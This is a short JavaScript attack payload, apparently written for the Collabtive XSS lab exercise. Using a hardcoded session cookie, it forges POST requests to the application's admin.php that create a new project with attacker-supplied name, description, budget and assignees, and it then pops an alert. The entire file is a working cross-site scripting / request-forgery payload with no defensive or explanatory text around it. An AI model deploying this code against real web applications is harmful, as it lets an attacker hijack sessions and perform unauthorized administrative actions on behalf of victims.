function h4x()
{
var Ajax=null;
// Construct the header information for the HTTP request
Ajax=new XMLHttpRequest();
Ajax.withCredentials = true;
Ajax.open("POST","http://www.xsslabcollabtive.com/admin.php?action=addpro",true);
Ajax.setRequestHeader("Host","www.xsslabcollabtve.com");
Ajax.setRequestHeader("Cookie", "PHPSESSID=udaujefevmj43ilqrg414tnon6");
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");

var Ajax1=null;
Ajax1=new XMLHttpRequest();
Ajax1.withCredentials = true;
Ajax1.open("POST","http://www.xsslabcollabtive.com/admin.php?action=projects&mode=added",true);
Ajax1.setRequestHeader("Host","www.xsslabcollabtve.com");
Ajax1.setRequestHeader("Cookie", "PHPSESSID=udaujefevmj43ilqrg414tnon6");
Ajax1.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
// Construct the content.
var content="name=heeelp&desc=plz&end=27.10.2015&budget=9000&assignto%5B%5D=2&assignto%5B%5D=1&assignme=1";
// Send the HTTP POST request.
Ajax.send(content);
Ajax1.send();
alert("Hi");
return true;
}

h4x();